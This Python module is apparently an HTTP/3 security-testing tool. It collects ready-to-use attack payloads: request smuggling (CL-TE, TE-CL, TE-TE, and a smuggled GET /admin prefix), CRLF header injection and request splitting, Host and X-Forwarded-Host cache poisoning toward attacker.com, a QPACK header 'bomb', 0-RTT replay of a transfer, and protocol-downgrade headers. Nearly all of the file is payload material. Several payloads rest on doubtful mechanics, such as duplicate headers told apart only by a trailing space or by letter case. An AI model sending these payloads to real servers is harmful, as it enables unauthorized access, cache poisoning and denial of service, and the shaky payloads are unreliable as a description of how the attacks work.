"""
HTTP/3 Connection Contamination Attack Payloads

This module contains various attack payloads for testing connection contamination
vulnerabilities including request smuggling, header injection, and protocol-specific attacks.

"""

from typing import Dict, List, Tuple
from dataclasses import dataclass


@dataclass
class AttackPayload:
    """Represents an attack payload"""
    name: str
    description: str
    headers: Dict[str, str]
    body: str
    expected_behavior: str
    detection_method: str


class RequestSmugglingPayloads:
    """Request smuggling attack payloads"""
    
    @staticmethod
    def cl_te_basic() -> AttackPayload:
        """
        CL-TE (Content-Length vs Transfer-Encoding) desync attack
        Front-end uses Content-Length, back-end uses Transfer-Encoding
        """
        return AttackPayload(
            name="CL-TE Basic Smuggling",
            description="Front-end processes Content-Length, back-end processes Transfer-Encoding",
            headers={
                "Content-Length": "13",
                "Transfer-Encoding": "chunked"
            },
            body="0\r\n\r\nSMUGGLED",
            expected_behavior="Back-end should process smuggled request",
            detection_method="Check if smuggled request affects subsequent requests"
        )
    
    @staticmethod
    def te_cl_basic() -> AttackPayload:
        """
        TE-CL (Transfer-Encoding vs Content-Length) desync attack
        Front-end uses Transfer-Encoding, back-end uses Content-Length
        """
        return AttackPayload(
            name="TE-CL Basic Smuggling",
            description="Front-end processes Transfer-Encoding, back-end processes Content-Length",
            headers={
                "Content-Length": "4",
                "Transfer-Encoding": "chunked"
            },
            body="5c\r\nSMUGGLED REQUEST\r\n0\r\n\r\n",
            expected_behavior="Back-end should see truncated request",
            detection_method="Monitor response timing and content differences"
        )
    
    @staticmethod
    def te_te_obfuscation() -> AttackPayload:
        """
        TE-TE desync using Transfer-Encoding obfuscation
        Both use Transfer-Encoding but one doesn't recognize obfuscated header
        """
        return AttackPayload(
            name="TE-TE Obfuscation",
            description="Obfuscate Transfer-Encoding to cause desync",
            headers={
                "Transfer-Encoding": "chunked",
                "Transfer-encoding": "identity"  # Note lowercase 'e'
            },
            body="0\r\n\r\nSMUGGLED",
            expected_behavior="One server ignores obfuscated header",
            detection_method="Check for request processing differences"
        )
    
    @staticmethod
    def cl_te_with_prefix() -> AttackPayload:
        """CL-TE with request prefix smuggling"""
        smuggled_request = (
            "GET /admin HTTP/1.1\r\n"
            "Host: vulnerable-website.com\r\n"
            "Content-Length: 10\r\n"
            "\r\n"
            "x="
        )
        
        return AttackPayload(
            name="CL-TE Prefix Smuggling",
            description="Smuggle complete HTTP request as prefix",
            headers={
                "Content-Length": str(len(smuggled_request) + 2),
                "Transfer-Encoding": "chunked"
            },
            body=f"0\r\n\r\n{smuggled_request}",
            expected_behavior="Smuggled request executed on next connection",
            detection_method="Monitor for unauthorized admin access"
        )
    
    @staticmethod
    def chunked_encoding_variants() -> List[AttackPayload]:
        """Various chunked encoding variations for testing"""
        variants = []
        
        # Space after chunk size
        variants.append(AttackPayload(
            name="Chunked with Space",
            description="Space after chunk size",
            headers={"Transfer-Encoding": "chunked"},
            body="5 \r\nHello\r\n0\r\n\r\n",
            expected_behavior="Some servers may misparse",
            detection_method="Check response parsing"
        ))
        
        # Tab after chunk size
        variants.append(AttackPayload(
            name="Chunked with Tab",
            description="Tab character after chunk size",
            headers={"Transfer-Encoding": "chunked"},
            body="5\t\r\nHello\r\n0\r\n\r\n",
            expected_behavior="Tab may cause parsing issues",
            detection_method="Monitor for parsing errors"
        ))
        
        # Multiple Transfer-Encoding headers
        variants.append(AttackPayload(
            name="Multiple Transfer-Encoding",
            description="Multiple Transfer-Encoding headers",
            headers={
                "Transfer-Encoding": "chunked",
                "Transfer-Encoding ": "identity"  # Note trailing space
            },
            body="0\r\n\r\n",
            expected_behavior="Header confusion",
            detection_method="Check which header is processed"
        ))
        
        return variants


class HTTP3SpecificPayloads:
    """HTTP/3 and QUIC-specific attack payloads"""
    
    @staticmethod
    def frame_injection() -> AttackPayload:
        """HTTP/3 frame injection attack"""
        return AttackPayload(
            name="HTTP/3 Frame Injection",
            description="Inject malicious HTTP/3 frames",
            headers={
                "Content-Type": "application/octet-stream",
                ":method": "POST",
                ":path": "/",
                ":scheme": "https"
            },
            body="\x00\x00\x04\x01\x00\x00\x00\x00",  # Malformed frame
            expected_behavior="Server may misprocess frame",
            detection_method="Monitor for frame processing errors"
        )
    
    @staticmethod
    def zero_rtt_replay() -> AttackPayload:
        """0-RTT replay attack payload"""
        return AttackPayload(
            name="0-RTT Replay Attack",
            description="Replay 0-RTT data to cause duplicate operations",
            headers={
                "Early-Data": "1",
                "Content-Type": "application/json"
            },
            body='{"action": "transfer", "amount": 1000}',
            expected_behavior="Non-idempotent operation replayed",
            detection_method="Check for duplicate transactions"
        )
    
    @staticmethod
    def qpack_bomb() -> AttackPayload:
        """QPACK compression bomb"""
        return AttackPayload(
            name="QPACK Compression Bomb",
            description="Exploit QPACK header compression",
            headers={
                "X-Large-Header": "A" * 65535,  # Maximum header size
                "X-Compressed": "B" * 65535
            },
            body="",
            expected_behavior="Excessive memory consumption",
            detection_method="Monitor server resource usage"
        )
    
    @staticmethod
    def stream_multiplexing_abuse() -> AttackPayload:
        """Stream multiplexing contamination"""
        return AttackPayload(
            name="Stream Multiplexing Abuse",
            description="Abuse QUIC stream multiplexing",
            headers={
                "X-Stream-Priority": "urgent",
                "X-Stream-Weight": "256"
            },
            body="STREAM_DATA",
            expected_behavior="Stream priority manipulation",
            detection_method="Monitor stream processing order"
        )


class HeaderInjectionPayloads:
    """Header injection attack payloads"""
    
    @staticmethod
    def crlf_injection() -> List[AttackPayload]:
        """CRLF injection variants"""
        payloads = []
        
        # Basic CRLF injection
        payloads.append(AttackPayload(
            name="Basic CRLF Injection",
            description="Inject CRLF to add headers",
            headers={
                "X-Forwarded-For": "127.0.0.1\r\nX-Admin: true"
            },
            body="",
            expected_behavior="Additional header injected",
            detection_method="Check if X-Admin header is processed"
        ))
        
        # Double CRLF for request splitting
        payloads.append(AttackPayload(
            name="Request Splitting",
            description="Use double CRLF to split requests",
            headers={
                "X-Custom": "value\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com"
            },
            body="",
            expected_behavior="Second request smuggled",
            detection_method="Monitor for split request execution"
        ))
        
        # Unicode normalization
        payloads.append(AttackPayload(
            name="Unicode CRLF",
            description="Unicode characters that normalize to CRLF",
            headers={
                "X-Test": "value\u000d\u000aX-Injected: true"
            },
            body="",
            expected_behavior="Unicode normalized to CRLF",
            detection_method="Check header parsing"
        ))
        
        return payloads
    
    @staticmethod
    def host_header_injection() -> List[AttackPayload]:
        """Host header manipulation payloads"""
        return [
            AttackPayload(
                name="Duplicate Host Headers",
                description="Multiple Host headers",
                headers={
                    "Host": "legitimate.com",
                    "Host ": "attacker.com"  # Note trailing space
                },
                body="",
                expected_behavior="Server confusion on which host to use",
                detection_method="Check which host is processed"
            ),
            AttackPayload(
                name="Host Header with Port",
                description="Manipulate host with port",
                headers={
                    "Host": "legitimate.com:80@attacker.com"
                },
                body="",
                expected_behavior="URL parsing confusion",
                detection_method="Monitor backend routing"
            )
        ]


class CachePoisoningPayloads:
    """Cache poisoning attack payloads"""
    
    @staticmethod
    def unkeyed_header_poisoning() -> List[AttackPayload]:
        """Exploit unkeyed headers for cache poisoning"""
        return [
            AttackPayload(
                name="X-Forwarded-Host Poisoning",
                description="Poison cache via X-Forwarded-Host",
                headers={
                    "X-Forwarded-Host": "attacker.com",
                    "X-Forwarded-Proto": "https"
                },
                body="",
                expected_behavior="Cached response with attacker's host",
                detection_method="Check cached response headers"
            ),
            AttackPayload(
                name="X-Original-URL Poisoning",
                description="Override URL via unkeyed header",
                headers={
                    "X-Original-URL": "/admin/delete?user=victim"
                },
                body="",
                expected_behavior="Cache stores response for wrong URL",
                detection_method="Verify cache key generation"
            )
        ]
    
    @staticmethod
    def http_method_override() -> AttackPayload:
        """HTTP method override for cache poisoning"""
        return AttackPayload(
            name="Method Override Poisoning",
            description="Override HTTP method to poison cache",
            headers={
                "X-HTTP-Method-Override": "DELETE",
                "X-Method-Override": "DELETE"
            },
            body="",
            expected_behavior="GET request cached as DELETE",
            detection_method="Check if method override affects caching"
        )


class ProtocolDowngradePayloads:
    """Protocol downgrade attack payloads"""
    
    @staticmethod
    def force_http2_downgrade() -> AttackPayload:
        """Force downgrade from HTTP/3 to HTTP/2"""
        return AttackPayload(
            name="HTTP/3 to HTTP/2 Downgrade",
            description="Force protocol downgrade",
            headers={
                "Alt-Svc": "clear",
                "Upgrade": "h2c"
            },
            body="",
            expected_behavior="Connection downgrades to HTTP/2",
            detection_method="Monitor protocol version in use"
        )
    
    @staticmethod
    def alpn_manipulation() -> AttackPayload:
        """ALPN protocol negotiation manipulation"""
        return AttackPayload(
            name="ALPN Manipulation",
            description="Manipulate ALPN negotiation",
            headers={
                "Connection": "Upgrade",
                "Upgrade": "h2c, http/1.1"
            },
            body="",
            expected_behavior="Protocol negotiation confusion",
            detection_method="Check negotiated protocol"
        )


class PayloadGenerator:
    """Generate and manage attack payloads"""
    
    @staticmethod
    def get_all_payloads() -> Dict[str, List[AttackPayload]]:
        """Get all attack payloads organized by category"""
        smuggling = RequestSmugglingPayloads()
        http3 = HTTP3SpecificPayloads()
        headers = HeaderInjectionPayloads()
        cache = CachePoisoningPayloads()
        downgrade = ProtocolDowngradePayloads()
        
        return {
            "request_smuggling": [
                smuggling.cl_te_basic(),
                smuggling.te_cl_basic(),
                smuggling.te_te_obfuscation(),
                smuggling.cl_te_with_prefix(),
                *smuggling.chunked_encoding_variants()
            ],
            "http3_specific": [
                http3.frame_injection(),
                http3.zero_rtt_replay(),
                http3.qpack_bomb(),
                http3.stream_multiplexing_abuse()
            ],
            "header_injection": [
                *headers.crlf_injection(),
                *headers.host_header_injection()
            ],
            "cache_poisoning": [
                *cache.unkeyed_header_poisoning(),
                cache.http_method_override()
            ],
            "protocol_downgrade": [
                downgrade.force_http2_downgrade(),
                downgrade.alpn_manipulation()
            ]
        }
    
    @staticmethod
    def get_payload_by_name(name: str) -> AttackPayload:
        """Get specific payload by name"""
        all_payloads = PayloadGenerator.get_all_payloads()
        for category_payloads in all_payloads.values():
            for payload in category_payloads:
                if payload.name == name:
                    return payload
        raise ValueError(f"Payload '{name}' not found")
    
    @staticmethod
    def get_payloads_by_category(category: str) -> List[AttackPayload]:
        """Get all payloads for a specific category"""
        all_payloads = PayloadGenerator.get_all_payloads()
        if category not in all_payloads:
            raise ValueError(f"Category '{category}' not found")
        return all_payloads[category]


# Export commonly used payloads
__all__ = [
    'AttackPayload',
    'RequestSmugglingPayloads',
    'HTTP3SpecificPayloads',
    'HeaderInjectionPayloads',
    'CachePoisoningPayloads',
    'ProtocolDowngradePayloads',
    'PayloadGenerator'
]
